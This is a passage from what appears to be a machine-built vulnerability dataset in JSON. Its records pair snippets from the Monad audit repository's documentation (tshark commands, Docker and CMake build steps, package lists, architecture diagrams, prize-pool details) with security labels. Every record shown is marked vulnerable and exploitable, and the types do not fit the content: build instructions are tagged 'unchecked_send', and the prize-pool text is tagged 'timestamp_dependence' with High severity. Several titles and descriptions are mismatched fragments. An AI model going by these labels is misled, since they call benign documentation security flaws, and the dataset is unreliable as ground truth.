    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\ntshark -r raptorcast.pcap -V -T fields -E separator=/t \\\n        -e frame.time_relative \\\n        -e ip.src_host \\\n        -e ip.dst_host \\\n        -e udp.srcport \\\n        -e udp.dstport \\\n        -e raptorcast.author \\\n        -e raptorcast.broadcast \\\n        -e raptorcast.unix_ts_ms \\\n        -e raptorcast.delay_ms \\\n        -e raptorcast.app_message_hash \\\n        -e raptorcast.app_message_len \\\n        -e raptorcast.merkle_root \\\n        -e raptorcast.first_hop_recipient \\\n        -e raptorcast.merkle_leaf_index \\\n        -e raptorcast.encoding_symbol_id \\\n        -e raptorcast.encoded_symbol_len\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "This directory contains a Wireshark dissector for the RaptorCast protocol.",
    "description": "This dissector supports version 0 of the RaptorCast protocol, which is the current and latest version, and supports the following features: - Decoding and displaying of all protocol header fields, with foldable signature and Merkle proof sections. - Naive validity checking of protocol fields for which it is feasible.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 19,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.611,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nThen build the dissector (see below), and copy the `raptorcast.so` file\nto the wireshark plug-in directory in your home directory, as follows:\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Gas",
    "title": "apt install tshark          # Ubuntu 25.04",
    "description": "Then build the dissector (see below), and copy the `raptorcast.so` file to the wireshark plug-in directory in your home directory, as follows:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.144,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": " ubuntu:25.04 /bin/bash\napt update\nln -s /usr/share/zoneinfo/posix/UTC /etc/localtime\napt -y dist-upgrade\napt -y install build-essential cmake git libsecp256k1-dev wireshark-dev\n\ncd /tmp\ngit clone https://github.com/BLAKE3-team/BLAKE3/\ncd BLAKE3/c\nmkdir build\ncd build\ncmake -DBUILD_SHARED_LIBS=1 ..\nmake\nmake install\nln -s ../local/lib/libblake3.so /usr/lib64/libblake3.so\n\nln -s ../lib/x86_64-linux-gnu/libsecp256k1.so /usr/lib64/libsecp256k1.so\n\ncd $SRCDIR\nrm -rf build\nmkdir build\ncd build\ncmake ..\nmake\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Ubuntu 25.04",
    "description": "mkdir -p ~/.local/lib/wireshark/plugins/4.2/epan cp raptorcast.so ~/.local/lib/wireshark/plugins/4.2/epan/ Building the dissector for Fedora 41 ------------------------------------ To build the dissector for Fedora 41 in a Docker container, run the",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 25,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.508,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "docker run -p 8080:8080 --volume $(pwd)/docker/devnet/monad:/monad monad-rpc",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "# Devnet",
    "description": "To start a consensus client, run the following: 1. Run `bash docker/devnet/clean.sh` to clean all previously generated files 2. Run `docker build -t monad-node -f docker/devnet/Dockerfile .` to build the docker image for the node 3. Run `docker run -d --volume $(pwd)/docker/devnet/monad:/monad monad-node` to run the docker container To start a JsonRpc server, run the following (the consensus node must be first started):",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.076,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "Publicly Known Issues",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "High",
    "title": "# Monad audit details",
    "description": "- Total Prize Pool: $504,000 in USDC - Warden pool: $500,000 in USDC - HM awards: $480,000 in USDC - QA awards: $20,000 in USDC - Judge awards: $3,500 in USDC",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.021,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "Automated Findings / Publicly Known Issues",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "Automated Findings / Publicly Known Issues",
    "description": "_Note for C4 wardens: Anything included in this `Automated Findings / Publicly Known Issues` section is considered a publicly known issue and is ineligible for awards._ The following issues and risks are considered **known** or **by design** and will not be considered valid findings in this contest. - Block policy discounts gas price by incorrectly applying EIP-1559 to legacy transactions (C4 staff note: this issue was addressed by a public [PR](https://github.com/category-labs/monad-bft/pull/2386) on September 25, 2025 at 18:30 UTC; therefore all submissions of this finding after that timestamp will be considered out of scope.) - Reserve balance checks were not applied consistently to create transactions, e.g. CREATE / CREATE2 (C4 staff note: there was a public PR originally created to address this issue on September 16, 2025 at 15:38 UTC; therefore all submissions related to this finding after that timestamp will be considered out of scope.) - Duplicated validation logic for EIP-7702 authorization lists. (C4 staff note: this issue was addressed by a public [PR](https://github.com/category-labs/monad-bft/pull/2365))",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.042,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "cd docker/single-node",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "Using Docker",
    "description": "The most straightforward way to start a consensus client + an execution client + a JsonRpc server. Run the following: 1. `cd docker/single-node` 2. `nets/run.sh`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.021,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "mermaid\nsequenceDiagram\nautonumber\n    participant D as Driver\n    box Purple Executor\n    participant S as impl Stream\n    participant E as impl Executor\n    end\n    participant State\n    participant PersistenceLogger\n    loop\n    D ->>+ S: CALL next()\n    Note over S: blocks until event ready\n    S -->>- D: RETURN Event\n    D ->> PersistenceLogger: CALL push(Event)\n    D ->>+ State: CALL update(Event)\n    Note over State: mutate state\n    State -->>- D: RETURN Vec<Command>\n    D ->> E: CALL exec(Vec<Command>)\n    Note over E: apply side effects\n    end\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Architecture",
    "description": "sequenceDiagram autonumber participant D as Driver box Purple Executor participant S as impl Stream",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.561,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nThe above command will do several things:\n\n- Use gcc-15 instead of the system's default compiler\n\n- Emit machine code using Haswell-era CPU extensions\n\n- Run CMake, and generate a [ninja](https://ninja-build.org/) build\n  system in the `<path-to-execution-repo>/build` directory with\n  the [`CMAKE_BUILD_TYPE`](https://cmake.org/cmake/help/latest/variable/CMAKE_BUILD_TYPE.html)\n  set to `RelWithDebInfo` by default\n\n- Build the CMake `all` target, which builds everything\n\nThe compiler and CPU options are injected via environment variables that\nare read by CMake.  If you want debug binaries instead, you can also pass\n`CMAKE_BUILD_TYPE=Debug` via the environment.\n\nWhen finished, this will build all of the execution binaries. The main one is\nthe execution daemon, `build/cmd/monad`. This binary can provide block\nexecution services for different EVM-compatible blockchains:\n\n- When used as part of a Monad blockchain node, it behaves as the block\n  execution service for the Category Labs consensus daemon (for details, see\n  [here](docs/overview.md#how-is-execution-used)); when running in this mode,\n  Monad EVM extensions (e.g., Monad-style staking) are enabled\n\n- It can also replay the history of other EVM-compatible blockchains, by\n  executing their historical blocks as inputs; a common developer workflow\n  (and a good full system test) is to replay the history of the original\n  Ethereum mainnet and verify that the computed Merkle roots match after\n  each block\n\nYou can also run the full test suite in parallel with:\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "High",
    "title": "Compiling the execution code",
    "description": "First, change your working directory to the root directory of the execution git repository root and then run: CC=gcc-15 CXX=g++-15 CFLAGS=\"-march=haswell\" CXXFLAGS=\"-march=haswell\" ASMFLAGS=\"-march=haswell\" \\ ./scripts/configure.sh && ./scripts/build.sh The above command will do several things:",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 35,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n                       \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n                       \u2551                                \u2551      Reads new blocks\n  Writes new blocks    \u2551         The \"ledger\":          \u2551       written by the\n     proposed by   \u250c\u2500\u2500\u25b6\u2551 a directory on the filesystem  \u2551\u2500\u2500\u2500\u2500\u2510 consensus daemon\n   consensus peers \u2502   \u2551    containing recent blocks    \u2551    \u2502 and executes them\n                   \u2502   \u2551                                \u2551    \u2502\n                   \u2502   \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d    \u2502\n                   \u2502                                         \u2502\n                   \u2502                                         \u25bc\n   \u250c\u2500Consensus daemon\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510        \u250c\u2500Execution daemon\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n   \u2502                               \u2502        \u2502                                \u2502\n   \u2502\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\u2502        \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502\n   \u2502\u2502                             \u2502\u2502        \u2502 \u2502       runloop_monad        \u2502 \u2502\n   \u2502\u2502       Monad consensus       \u2502\u2502        \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502\n   \u2502\u2502          algorithm          \u2502\u2502        \u2502 \u2502                            \u2502 \u2502\n   \u2502\u2502                             \u2502\u2502        \u2502 \u2502    libmonad_execution.a    \u2502 \u2502\n   \u2502\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\u2502        \u2502 \u2502  static library functions  \u2502 \u2502\n   \u2502\u2502                             \u2502\u2502        \u2502 \u2502 (including EVM and triedb) \u2502 \u2502\n   \u2502\u2502    libmonad_execution.so    \u2502\u2502        \u2502 \u2502                            \u2502 \u2502\n   \u2502\u2502 (including triedb read API) \u2502\u2502        \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2502\n   \u2502\u2502                             \u2502\u2502        \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n   \u2502\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b2\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\u2502                         \u2502\n   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                         \u2502\n                   \u2502                                         \u2502\n                   \u2502                                         \u2502\n                   \u2502  \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557     \u2502\n                   \u2502  \u2551                                \u2551     \u2502\n                   \u2502  \u2551     TrieDB database file:      \u2551     \u2502\n                   \u2514\u2500\u2500\u2563     typically a dedicated      \u2551\u25c0\u2500\u2500\u2500\u2500\u2518\n   Hosted execution   \u2551       NVMe block device        \u2551     Execution results\n   library can read   \u2551                                \u2551    (e.g., state roots)\n  results from triedb \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d    are written to the\n                                                              triedb database\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "How is execution used?",
    "description": "Most of the source code in this repository is compiled into a single library, called `libmonad_execution.a` (or `libmonad_execution.so`, if you compile using shared libraries). This library is used in a few different ways: 1. **Stand-alone/daemon mode**: the execution daemon (source code in the",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 35,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nbuild-essential\ncmake\nllvm-19-dev\nlibbenchmark-dev\nlibcli11-dev\nlibgmock-dev\nlibgtest-dev\nlibtbb-dev\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Building & Running",
    "description": "The compiler is built and tested in CI on Ubuntu 24.04. To build locally, first install the following dependencies via `apt`: build-essential cmake llvm-19-dev",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 10,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.102,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nIt will implicitly skip blockchain tests which\n* contain invalid blocks and\n* contain unexpected json format and\n* execute slowly.\n\nUse the ",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "Ethereum Tests",
    "description": "The ethereum blockchain tests can be executed with the command $ build/test/blockchain/compiler-blockchain-tests It will implicitly skip blockchain tests which * contain invalid blocks and * contain unexpected json format and",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.141,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n$ export MONAD_COMPILER_ASM_DIR=/tmp/debug\n$ export MONAD_COMPILER_DEBUG_TRACE=1\n$ build/test/blockchain/compiler-blockchain-tests \\\n    --gtest_filter=\"*.jumpiNonConst\"\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Configuring blockchain test VM",
    "description": "Environment variables can be used for debugging tests based on the blockchain test vm. Both the fuzzer and the etherum tests are based on the blockchain test vm. By setting the `MONAD_COMPILER_ASM_DIR` environment variable to a valid directory, the compiler will print contract",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.171,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n$ export MONAD_COMPILER_DEBUG_TRACE=1\n$ export EVMONE_DEBUG_TRACE=1\n$ build/test/blockchain/compiler-blockchain-tests \\\n    --gtest_filter=\"*.jumpiNonConst\"\n...\noffset: 0x59  opcode: 0x90  gas_left: 29977858\noffset: 0x5a  opcode: 0x62  gas_left: 29977855\noffset: 0x5e  opcode: 0x1  gas_left: 29977852\noffset: 0x5f  opcode: 0x55  gas_left: 29977849\noffset: 0x60  opcode: 0x0  gas_left: 29975649\nSTART baseline_execute address 095E7BAEA6A6C7C4C2DFEB977EFAC326AF552D87 with gas = 379000\nBlock 0x00: gas remaining: 379000\nBlock 0x2d: gas remaining: 378784\nEND baseline_execute address 095E7BAEA6A6C7C4C2DFEB977EFAC326AF552D87\noffset: 0x00  opcode: 0x33  gas_left: 30000000\noffset: 0x01  opcode: 0x73  gas_left: 29999998\n...\noffset: 0x16  opcode: 0x14  gas_left: 29999995\noffset: 0x5f  opcode: 0x55  gas_left: 29977849\noffset: 0x60  opcode: 0x0  gas_left: 29975649\nSTART baseline_execute address 095E7BAEA6A6C7C4C2DFEB977EFAC326AF552D87 with gas = 379000\nBlock 0x00: gas remaining: 379000\nEND baseline_execute address 095E7BAEA6A6C7C4C2DFEB977EFAC326AF552D87\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "The `MONAD_COMPILER_TESTING` configuration",
    "description": "If the project is configured with `MONAD_COMPILER_TESTING` enabled, e.g. $ cmake -S . -B build -DMONAD_COMPILER_TESTING=ON then debug assertions will be enabled even when the `NDEBUG` macro is defined. With `MONAD_COMPILER_TESTING` configuration one can also define the `EVMONE_DEBUG_TRACE=1` environment variable to get runtime debug",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 25,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "console\nbuild/src/test/utils/directory-type-check my/contracts-dir\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Directory Type Check Test",
    "description": "After building the compiler source code, the `directory-type-check` executable can be used on a directory containing bytecode contracts. It will recursively traverse the directory and run the type inference algorithm on all the contracts. It will additionally run the type checking algorithm to verify the correctness of the inferred types. For example",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.067,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "MONAD_COMPILER_BENCHMARKS=ON",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Benchmarks",
    "description": "The project contains several sets of performance benchmarks that are not built by default. To enable them, set `MONAD_COMPILER_BENCHMARKS=ON` via CMake. This option is orthogonal to `MONAD_COMPILER_TESTING`; it's possible to build the benchmark executables with debug assertions enabled, but the results obtained will not be accurate.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.028,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "console\n$ cmake -DCMAKE_BUILD_TYPE=Debug -DCOVERAGE=ON -S . -B build -G Ninja\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Coverage",
    "description": "To enable coverage statistics set `-DCOVERAGE=ON` when configuring, e.g. $ cmake -DCMAKE_BUILD_TYPE=Debug -DCOVERAGE=ON -S . -B build -G Ninja After running the desired executable, use `gcovr .` to gather coverage statistics.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.078,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "json\n\"disasexpl.associations\": {\n    \"**/*.c\": \"${workspaceFolder}/build/asm/${fileBasename}.s\",\n    \"**/*.cpp\": \"${workspaceFolder}/build/asm/${fileBasename}.s\"\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Dumping assembly",
    "description": "Passing `-DMONAD_COMPILER_DUMP_ASM=On` to CMake, will dump all `.s` assembly files for the monad code into `build/asm`. One can then use the following vscode extension: https://github.com/dseight/vscode-disasexpl to view the assembly. In order for this to work, add the following setting to `.vscode/settings.json` file inside the `monad-compiler` repo (if your CMake build folder is called something else, modify appropriately): \"disasexpl.associations\": { \"**/*.c\": \"${workspaceFolder}/build/asm/${fileBasename}.s\", \"**/*.cpp\": \"${workspaceFolder}/build/asm/${fileBasename}.s\" }",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-09-monad",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.164,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n                                 WINDOW_INCR\n                                  \u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\n  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n  \u2502\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\u2502\n  \u2502\u2502\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2502.....\u2502\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2502\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2502\u2502\n  \u2502\u2502\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2502.....\u2502\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2502\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2502\u2502\n  \u2502\u2502\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2593\u2502.....\u2502\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2502\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2502\u2502\n  \u2502\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u25b2\u2500\u2500\u2500\u2500\u25b2\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u25b2\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\u2502\n  \u2514\u2500Payload buffer\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                             \u2502    \u2502        \u2502\n                             \u2502    \u2502        buffer_window_start\n                             \u2502    \u2502\n                             \u2502    buffer_window_end\n                             \u2502\n                             next_payload_byte\n\n  \u250c\u2500Legend\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n  \u2502                                              \u2502\n  \u2502 \u2591 oldest events, no longer valid             \u2502\n  \u2502 \u2592 older events, before buffer wrapped around \u2502\n  \u2502 \u2593 newer events, after buffer wrapped around  \u2502\n  \u2502 . next event will be allocated from here     \u2502\n  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "Sliding buffer window",
